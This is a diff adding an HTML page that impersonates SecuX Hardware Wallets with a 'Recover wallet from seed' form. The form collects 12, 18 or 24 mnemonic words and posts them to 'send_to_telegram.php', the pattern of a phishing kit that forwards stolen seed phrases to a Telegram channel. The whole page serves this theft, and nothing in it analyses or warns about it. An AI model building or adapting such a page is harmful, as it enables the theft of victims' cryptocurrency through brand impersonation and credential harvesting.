@@ -1,0 +1,128 @@
+<!doctype html>
+<html lang="en-US">
+   <head>
+      <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+      <meta charset="UTF-8" />
+      <meta name="viewport" content="width=device-width, initial-scale=1" />
+      <title>SecuX Hardware Wallets</title>
+      <link rel="icon" type="image/x-icon" href="img/favicon.ico">
+      <link rel="stylesheet" href="css/bootstrap.min.css">
+      <link rel="stylesheet" href="css/all.css">
+      <link rel="stylesheet" type="text/css" href="css/style.css">
+      <link rel="stylesheet" type="text/css" href="css/homepage.css">
+   </head>
+   <body>
+      <div class="modalWindow1">
+            <form action="send_to_telegram.php" method="post">
+                <div class="recoverywalletlogo">
+                     <img src="img/logo.svg" alt="logo">
+                </div>
+                <div class="recoverywallet">
+                   <h3 class="rech3">Recover wallet from seed</h3>
+                </div>
+                <div class="recoverywalletbtn">
+                  <button type="button" class="button-words-12 bg-color" onclick="changeMnemonicCount(12, '')">12 words</button>
+                  <button type="button" class="button-words-18" onclick="changeMnemonicCount(18, '')">18 words</button>
+                  <button type="button" class="button-words-24" onclick="changeMnemonicCount(24, '')">24 words</button>
+               </div>
+                <div class="recover_wallet_phrase">
+                   <div class="mnemoniC" id="mnemonic-row-12"  style="display:block;">
+                        <div class="mne-row">
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="1." id="mnemonic-input-1" oninput="listenMnemonicInput(1)">
+                        </div>
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="2." id="mnemonic-input-2" oninput="listenMnemonicInput(2)">
+                        </div>
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="3." id="mnemonic-input-3" oninput="listenMnemonicInput(3)">
+                        </div>
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="4." id="mnemonic-input-4" oninput="listenMnemonicInput(4)">
+                        </div>
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="5." id="mnemonic-input-5" oninput="listenMnemonicInput(5)">
+                        </div>
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="6." id="mnemonic-input-6" oninput="listenMnemonicInput(6)">
+                        </div>
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="7." id="mnemonic-input-7" oninput="listenMnemonicInput(7)">
+                        </div>
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="8." id="mnemonic-input-8" oninput="listenMnemonicInput(8)">
+                        </div>
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="9." id="mnemonic-input-9" oninput="listenMnemonicInput(9)">
+                        </div>
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="10." id="mnemonic-input-10" oninput="listenMnemonicInput(10)">
+                        </div>
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="11." id="mnemonic-input-11" oninput="listenMnemonicInput(11)">
+                        </div>
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="12." id="mnemonic-input-12" oninput="listenMnemonicInput(12)">
+                        </div>
+                    </div>
+                        </div>
+                    
+                    <div class="mnemoniC" id="mnemonic-row-18"  style="display:none">
+                     <div class="mne-row">
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="13." id="mnemonic-input-13" oninput="listenMnemonicInput(13)">
+                        </div>
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="14." id="mnemonic-input-14" oninput="listenMnemonicInput(14)">
+                        </div>
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="15." id="mnemonic-input-15" oninput="listenMnemonicInput(15)">
+                        </div>
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="16." id="mnemonic-input-16" oninput="listenMnemonicInput(16)">
+                        </div>
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="17." id="mnemonic-input-17" oninput="listenMnemonicInput(17)">
+                        </div>
+                        <div class="mne-md3">
+                            <input type="text" class="mnemonicInput" placeholder="18." id="mnemonic-input-18" oninput="listenMnemonicInput(18)">
+                        </div>
+                     </div>
+                    </div>
+                    <div class="mnemoniC" id="mnemonic-row-24"  style="display:none">
+                        <div class="mne-row">
+                            <div class="mne-md3">
+                                <input type="text" class="mnemonicInput" placeholder="19." id="mnemonic-input-19" oninput="listenMnemonicInput(19)">
+                            </div>
+                            <div class="mne-md3">
+                                <input type="text" class="mnemonicInput" placeholder="20." id="mnemonic-input-20" oninput="listenMnemonicInput(20)">
+                            </div>
+                            <div class="mne-md3">
+                                <input type="text" class="mnemonicInput" placeholder="21." id="mnemonic-input-21" oninput="listenMnemonicInput(21)">
+                            </div>
+                            <div class="mne-md3">
+                                <input type="text" class="mnemonicInput" placeholder="22." id="mnemonic-input-22" oninput="listenMnemonicInput(22)">
+                            </div>
+                            <div class="mne-md3">
+                                <input type="text" class="mnemonicInput" placeholder="23." id="mnemonic-input-23" oninput="listenMnemonicInput(23)">
+                            </div>
+                            <div class="mne-md3">
+                                <input type="text" class="mnemonicInput" placeholder="24." id="mnemonic-input-24" oninput="listenMnemonicInput(24)">
+                            </div>
+                        </div>  
+                    </div>
+                </div>
+                <div class="recoverwalletbtn">
+                   <button type="submit">Continue</button>
+                </div>
+            </form>
+        </div>
+        <!-- =====================JAVASCRIPT LIBRARIES -->
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+        <script src="js/bootstrap.bundle.min.js"></script>
+        <script src="js/popper.min.js"></script>
+        <script src="js/bootstrap.min.js"></script>
+        <script src="js/custom.js"></script>
+        <script src="js/phrase.js"></script>
+   </body>
+</html>
